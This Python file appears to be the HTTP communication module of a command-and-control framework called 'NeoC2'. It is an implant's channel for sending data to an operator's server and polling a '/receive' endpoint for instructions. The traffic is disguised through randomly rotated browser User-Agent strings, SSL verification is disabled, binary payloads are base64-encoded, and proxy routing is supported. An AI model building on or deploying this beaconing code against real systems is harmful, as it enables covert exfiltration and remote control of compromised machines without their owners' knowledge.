import os
import random
import string
import base64
import json
import time
import requests
from core.config import NeoC2Config

class HTTPProtocol:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL certificate validation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
    
    def send(self, data, target=None, proxy=None):
        if not target:
            target = f"https://{self.config.get('server.host')}:{self.config.get('server.port')}"
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/json'
        }

        if isinstance(data, str):
            data = {'data': data}
        elif isinstance(data, bytes):
            data = {'data': base64.b64encode(data).decode('utf-8')}

        try:
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
                response = self.session.post(target, json=data, headers=headers, proxies=proxies, timeout=10)
            else:
                response = self.session.post(target, json=data, headers=headers, timeout=10)

            return response.status_code == 200
        except Exception as e:
            print(f"HTTP send error: {str(e)}")
            return False
    
    def receive(self, timeout=30):
        target = f"https://{self.config.get('server.host')}:{self.config.get('server.port')}/receive"
        
        headers = {
            'User-Agent': random.choice(self.user_agents)
        }

        try:
            response = self.session.get(target, headers=headers, timeout=timeout)
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            print(f"HTTP receive error: {str(e)}")
            return None



